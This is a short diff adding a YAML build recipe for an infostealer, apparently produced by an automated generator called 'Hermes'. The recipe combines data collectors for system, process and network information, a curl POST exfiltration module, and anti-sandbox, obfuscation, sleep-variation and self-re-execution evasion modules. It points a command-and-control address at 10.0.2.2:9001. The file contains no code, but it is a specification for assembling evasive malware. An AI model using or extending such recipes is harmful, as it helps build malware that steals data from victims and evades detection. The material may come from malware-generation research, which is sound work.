@@ -1,0 +1,20 @@
+name: infostealer_batch_cs_v7_fixed_exec
+description: Auto-generated recipe by Hermes (batch) - fixed core/file_ops removed
+format: batch
+core:
+- core/emit_buffer
+- core/run_cmd
+collectors:
+- collectors/sysinfo
+- collectors/processes
+- collectors/network
+exfil: exfil/curl_post
+arch: arch/sequential
+evasion:
+- evasion/sleep_variation
+- evasion/string_obfusc
+- evasion/self_reexec
+- evasion/anti_sandbox
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
